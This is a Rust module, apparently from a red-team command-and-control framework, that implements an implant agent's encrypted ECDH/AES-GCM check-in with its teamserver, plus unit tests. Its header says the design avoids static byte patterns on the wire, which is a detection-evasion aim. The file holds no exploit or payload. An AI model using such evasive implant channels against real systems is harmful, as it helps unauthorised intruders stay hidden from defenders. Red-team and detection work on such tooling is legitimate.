//! ECDH-based new-protocol transport for Specter (replaces Demon wire format).
//!
//! When `listener_pub_key` is present in [`SpecterConfig`], the agent performs
//! an X25519 ECDH handshake on first check-in.  All subsequent traffic is
//! encrypted with the negotiated AES-256-GCM session key.  No plaintext magic,
//! agent ID, or static byte patterns appear on the wire.

use red_cell_common::crypto::ecdh::{
    ConnectionId, build_registration_packet, open_session_response, parse_registration_response,
    seal_session_packet,
};

use crate::error::SpecterError;
use crate::transport::HttpTransport;

/// Live ECDH session after successful registration.
#[derive(Debug, Clone)]
pub struct EcdhSession {
    pub connection_id: ConnectionId,
    pub session_key: [u8; 32],
    pub agent_id: u32,
}

/// Perform the ECDH registration handshake with the teamserver.
///
/// Sends a registration packet containing the ephemeral public key and
/// encrypted agent metadata.  On success returns the negotiated session
/// that must be passed to [`send_session_packet`] for all subsequent requests.
pub async fn perform_registration(
    transport: &HttpTransport,
    listener_pub_key: &[u8; 32],
    metadata: &[u8],
) -> Result<EcdhSession, SpecterError> {
    let (packet, session_key) = build_registration_packet(listener_pub_key, metadata)
        .map_err(|e| SpecterError::Transport(format!("ECDH build_registration_packet: {e}")))?;

    let response = transport.send(&packet).await?;

    let (connection_id, agent_id) = parse_registration_response(&session_key, &response)
        .map_err(|e| SpecterError::Transport(format!("ECDH parse_registration_response: {e}")))?;

    Ok(EcdhSession { connection_id, session_key, agent_id })
}

/// Encrypt a check-in payload with the session key and send it.
///
/// Returns the decrypted server response payload.
pub async fn send_session_packet(
    transport: &HttpTransport,
    session: &EcdhSession,
    payload: &[u8],
) -> Result<Vec<u8>, SpecterError> {
    let packet = seal_session_packet(&session.connection_id, &session.session_key, payload)
        .map_err(|e| SpecterError::Transport(format!("ECDH seal_session_packet: {e}")))?;

    let response = transport.send(&packet).await?;

    if response.is_empty() {
        return Ok(Vec::new());
    }

    open_session_response(&session.session_key, &response)
        .map_err(|e| SpecterError::Transport(format!("ECDH open_session_response: {e}")))
}

/// Decode a base64-encoded listener public key from config.
///
/// Accepts standard or URL-safe base64, with or without padding.
pub fn decode_listener_pub_key(encoded: &str) -> Result<[u8; 32], SpecterError> {
    use base64::Engine as _;
    let bytes = base64::engine::general_purpose::STANDARD_NO_PAD
        .decode(encoded.trim())
        .or_else(|_| base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(encoded.trim()))
        .map_err(|e| SpecterError::Transport(format!("listener_pub_key base64 decode: {e}")))?;
    bytes.try_into().map_err(|_| {
        SpecterError::InvalidConfig("listener_pub_key must be exactly 32 bytes (base64-encoded)")
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::crypto::ecdh::{
        ListenerKeypair, build_registration_response, open_registration_packet, open_session_packet,
        seal_session_response,
    };

    fn test_keypair() -> ListenerKeypair {
        ListenerKeypair::generate().expect("keypair")
    }

    /// Simulate the full registration handshake without a live HTTP server.
    #[test]
    fn registration_handshake_e2e() {
        let kp = test_keypair();
        let metadata = b"specter-metadata";

        let (packet, agent_session_key) =
            build_registration_packet(&kp.public_bytes, metadata).expect("build");

        let parsed = open_registration_packet(&kp, 300, &packet).expect("open");
        assert_eq!(parsed.session_key, agent_session_key);
        assert_eq!(parsed.metadata, metadata.as_slice());

        let conn_id = ConnectionId::generate().expect("conn_id");
        let agent_id = 0x1337_1337_u32;
        let response =
            build_registration_response(&conn_id, &parsed.session_key, agent_id).expect("response");

        let (parsed_conn_id, parsed_agent_id) =
            parse_registration_response(&agent_session_key, &response).expect("parse");
        assert_eq!(parsed_conn_id, conn_id);
        assert_eq!(parsed_agent_id, agent_id);
    }

    #[test]
    fn session_packet_e2e() {
        let kp = test_keypair();
        let (_, session_key) = build_registration_packet(&kp.public_bytes, b"meta").expect("build");
        let conn_id = ConnectionId::generate().expect("conn_id");
        let session = EcdhSession { connection_id: conn_id, session_key, agent_id: 2 };

        let payload = b"specter-checkin";
        let packet = seal_session_packet(&session.connection_id, &session.session_key, payload)
            .expect("seal");

        let decrypted = open_session_packet(&session.session_key, &packet[16..]).expect("open");
        assert_eq!(decrypted, payload);

        let response_payload = b"task-for-specter";
        let sealed_resp =
            seal_session_response(&session.session_key, response_payload).expect("seal resp");
        let opened_resp =
            open_session_response(&session.session_key, &sealed_resp).expect("open resp");
        assert_eq!(opened_resp, response_payload);
    }

    #[test]
    fn decode_listener_pub_key_roundtrip() {
        use base64::Engine as _;
        let kp = test_keypair();
        let encoded = base64::engine::general_purpose::STANDARD_NO_PAD.encode(kp.public_bytes);
        let decoded = decode_listener_pub_key(&encoded).expect("decode");
        assert_eq!(decoded, kp.public_bytes);
    }

    #[test]
    fn decode_listener_pub_key_rejects_wrong_length() {
        use base64::Engine as _;
        let short = base64::engine::general_purpose::STANDARD_NO_PAD.encode(b"too-short");
        let result = decode_listener_pub_key(&short);
        assert!(result.is_err());
    }
}
